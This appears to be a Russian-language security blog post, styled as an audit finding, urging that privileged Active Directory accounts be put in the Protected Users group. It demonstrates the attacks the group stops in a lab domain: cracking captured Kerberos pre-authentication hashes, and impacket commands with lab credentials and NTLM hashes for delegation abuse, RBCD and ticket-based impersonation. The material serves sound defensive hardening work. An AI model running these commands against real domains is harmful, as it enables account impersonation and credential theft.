---
layout: post
title:  "Protected users"
categories: jekyll update
image: /images/vecteezy_knights-protecting-the-castle_.jpg
---

О необходимости включения привилегированных пользователей домена в группу Protected Users

#### Недостаток
Привилегированные пользователи домена не включены в группу Protected Users

#### Рекомендации
Включить привилегированных пользователей домена в группу Protected Users

Включение привилегированных пользователей домена в группу Protected Users способно значительно затруднить злоумышленнику развитие атаки, направленной на получение учетных данных указанных пользователей.

На учетные записи, включенные в группу Protected Users, накладываются следующие ограничения:

**1. Члены этой группы могут аутентифицироваться только по протоколу Kerberos. NTLM и CredSSP не работают.**

По умолчанию RDP использует NTLM-аутентификацию. При подключении по протоколу RDP учетные данные кэшируются на целевой машине и могут быть получены из процесса `lsass` с помощью таких инструментов как `mimikatz`.

![](/images/protected_users/Pasted%20image%2020241202174230.png)

В случае добавления пользователя в группу Protected Users сервис `lsass` не хранит NTLM-хэш пароля пользователя. Злоумышленник не сможет им воспользоваться c целью перемещения по ЛВС или взломать для получения пароля в открытом виде.

![](/images/protected_users/Pasted%20image%2020241202175742.png)

**2. Для пользователей этой группы в протоколе Kerberos при предварительной проверке подлинности не могут использоваться слабые алгоритмы шифрования, такие как DES или RC4 (требуется поддержка как минимум AES).**

Предварительная аутентификация в Active Directory требует от запрашивающего пользователя предоставить свой секретный ключ (DES, RC4, AES128 или AES256), полученный из пароля пользователя. Другими словами запрашивающий пользователь должен подтвердить предварительную аутентификацию, отправив временную метку, зашифрованную его собственными учетными данными.  Злоумышленник в результате атаки, направленной на перехват сетевого трафика (ARP spoofing, ICMP redirect, поддельный DHCP сервер, IPv6 spoofing), может перехватить сообщения предварительной аутентификации и попытаться взломать зашифрованные временные метки, чтобы получить пароль пользователя.

При атаке ARP Spoofing злоумышленник может отслеживать сообщения предварительной аутентификации с помощью утилиты wireshark.

Если используется алгоритм шифрования DES:
![](/images/protected_users/Pasted%20image%2020241203192551.png)

Приведем хэш к типу:
```
$krb5pa$23$des$DENYDC$$32d396a914a4d0a78e979ba75d4ff53c1db7294141760fee05e434c12ecf8d5b9aa5839e09a2244893aff5f384f79c37883f154a
```

Расшифровать можно следующим образом:

![](/images/protected_users/Pasted%20image%2020241203225924.png)
![](/images/protected_users/Pasted%20image%2020241203230322.png)

Если используется алгоритм шифрования AES:

![](/images/protected_users/Pasted%20image%2020241203185616.png)

Приведем хэш к типу:
```
$krb5pa$18$eddard.stark$NORTH.SEVENKINGDOMS.LOCAL$eacb91bde2a606c8f1b92a8752abba702371cb8bcf8bf233ced7e58532a31f60f0a989e6523d77229ab0adf2668b36c453ac6cd2f0036bf3
```

Расшифровать можно следующим образом:

![](/images/protected_users/Pasted%20image%2020241203234022.png)
![](/images/protected_users/Pasted%20image%2020241203234239.png)

Результаты бенчмарков на Nvidia RTX 3080: 1 351 000 000 хэшей в секунду DES против 960 000 хэшей в секунду AES.

**3. Члены этой группы не могут быть делегированы через ограниченную или неограниченную делегацию Kerberos.**

Делегирование используется когда учетная запись сервера или службы должна выдавать себя за другого пользователя. Самый простой пример когда веб-сервер олицетворяет пользователей при доступе к внутренним базам данных, обеспечивая доступ к данным.

Существует три вида делегирования:

- Kerberos Unconstrained Delegation (KUD) - Неограниченное делегирование
- Kerberos Constrained Delegation (KCD) - Ограниченное делегирование. Делится на ограниченное делегирование с переходом протокола (KCD with Protocol transition 
  (any authentication)) и ограниченное делегирование без перехода протокола (KCD without Protocol transition (kerberos only))
- Resource-based Constrained Delegation (RBCD) - Делегирование на основе ресурсов

Справочно:
- cервису, настроенному на KCD without protocol transition нужно, чтобы пользователь прошел аутентификацию, чтобы иметь возможность представляться от его лица во время s4u2proxy; 
- cервис, настроенный на KCD with protocol transition, использует s4u2self вместо ожидания аутентификации и может представляться другим пользователем.

Рассмотрим несколько атак злоумышленника.

**Ограниченное делегирование с переходом протокола**

Злоумышленник, имея учетную запись пользователя домена, может получить информацию о делегировании в домене.

```
impacket-findDelegation NORTH.SEVENKINGDOMS.LOCAL/arya.stark:Needle -target-domain north.sevenkingdoms.local
```

![](/images/protected_users/Pasted%20image%2020241205232434.png)

Зная пароль или хэш пароля учетной записи jon.snow, используя KCD with Protocol transition, злоумышленник может выдать себя за любого пользователя в домене (к примеру за eddard.stark) и получить от его имени доступ к службе cifs на машине winterfell.

```
impacket-getST -spn 'cifs/WINTERFELL' -impersonate eddard.stark -dc-ip 192.168.56.11 'north.sevenkingdoms.local/jon.snow:iknownothing'
```
![](/images/protected_users/Pasted%20image%2020241205235614.png)

В случае добавления пользователя eddard.stark в группу Protected Users злоумышленника ждет неудача.

![](/images/protected_users/Pasted%20image%2020241206151847.png)

**Ограниченное делегирование без перехода протокола**

При данном виде делегирования запросы S4U2self не приведут к созданию пересылаемых билетов службы, следовательно, не будут соответствовать требованиям для работы S4U2proxy.
Это означает, что служба не может сама по себе получить пересылаемый билет для пользователя к себе (т.е. для чего используется S4U2Self). Билет службы будет получен, но он не будет пересылаемым. И S4U2Proxy обычно нуждается в пересылаемом ST для работы.

Существует два известных способа, которыми злоумышленники могут обойти это и получить пересылаемый билет от имени пользователя в запрашивающую службу:
- осуществив атаку RBCD на сервис;
- путем принудительной аутентификации пользователя на сервисе или ожидания ее выполнения во время работы «прослушивателя Kerberos».

Рассмотрим атаку с помощью RBCD.

Добавим машинную учетную запись `rbcd$` в домен.
```
impacket-addcomputer -computer-name 'rbcd$' -computer-pass 'rbcd@123' -dc-host '192.168.56.11' -method 'LDAPS' -domain-netbios 'NORTH' 'north.sevenkingdoms.local/arya.stark:Needle'
```
![](/images/protected_users/Pasted%20image%2020241206121955.png)

В атрибут `msDS-AllowedToActOnBehalfOfOtherIdentity` хоста `CASTELBLACK` запишем созданную злоумышленником машинную учетную запись `rbcd$`.
```
impacket-rbcd -delegate-from rbcd$ -delegate-to CASTELBLACK$ -dc-ip 192.168.56.11 -action  write north.sevenkingdoms.local/castelblack$ -hashes aad3b435b51404eeaad3b435b51404ee:4af42f71719182020dff6fad1fbeeed6
```

![](/images/protected_users/Pasted%20image%2020241206123030.png)

Получим TGT для `rbcd$` и экспортируем себе.

```
impacket-getTGT north.sevenkingdoms.local/rbcd$:'rbcd@123' -dc-ip 192.168.56.11
export KRB5CCNAME=rbcd$.ccache
```

![](/images/protected_users/Pasted%20image%2020241206134913.png)

s4u2self Получим ST для пользователя eddard.stark.

```
impacket-getST -self -k -no-pass -impersonate eddard.stark -dc-ip 192.168.56.11 north.sevenkingdoms.local/rbcd:'rbcd@123'
```

![](/images/protected_users/Pasted%20image%2020241206143825.png)

s4u2proxy Получим ST для `host/CASTELBLACK` подставляя полученный выше билет.

```
impacket-getST -additional-ticket eddard.stark@rbcd@NORTH.SEVENKINGDOMS.LOCAL.ccache -spn host/CASTELBLACK -impersonate eddard.stark -dc-ip 192.168.56.11 north.sevenkingdoms.local/rbcd:'rbcd@123'
```

![](/images/protected_users/Pasted%20image%2020241206143958.png)

Делаем KCD подставляя этот билет.

```
impacket-getST -additional-ticket eddard.stark@host_CASTELBLACK@NORTH.SEVENKINGDOMS.LOCAL.ccache -spn cifs/WINTERFELL -impersonate eddard.stark -dc-ip 192.168.56.11 NORTH/CASTELBLACK$ -hashes aad3b435b51404eeaad3b435b51404ee:4af42f71719182020dff6fad1fbeeed6
```

![](/images/protected_users/Pasted%20image%2020241206144327.png)

В случае добавления пользователя eddard.stark в группу Protected Users злоумышленника ждет неудача на этапе получения ST для `host/CASTELBLACK`.

![](/images/protected_users/Pasted%20image%2020241206161753.png)

**4. Долгосрочные ключи Kerberos не сохраняются в памяти. Это значит, что при истечении TGT (по умолчанию 4 часа) пользователь должен повторно аутентифицироваться.**

**5. Для пользователей данной группы не сохраняются данные для кэшированного входа в домен.**

Злоумышленник, имея административные привилегии на хосте, может  получить доступ к 
хранилищу кэшированных учетных данных (LSA Secrets), в которых система хранит учетные данные, включая пароли пользователей, учетных записей служб, пароли InternetExpolorer, SQL и другие приватные данные, например ключи шифрования кэшированных доменных паролей.

![](/images/protected_users/Pasted%20image%2020241207003807.png)

Злоумышленник может взломать хэш учетной записи пользователя eddard.stark (эффективно только для слабых паролей).

В случае добавления пользователя в группу Protected Users система не хранит кэшированный доменный пароль пользователя (соответственно при недоступности контроллеров домена пользователи, являющиеся челнами группы Protected Users, не смогут аутентифицироваться на своих машинах через cached credential).

![](/images/protected_users/Pasted%20image%2020241207003916.png)

Источники:

https://habr.com/ru/companies/tomhunter/articles/683924/
https://habr.com/ru/articles/433566/
https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained

Картинка:

https://www.vecteezy.com/vector-art/3521075-knights-protecting-the-castle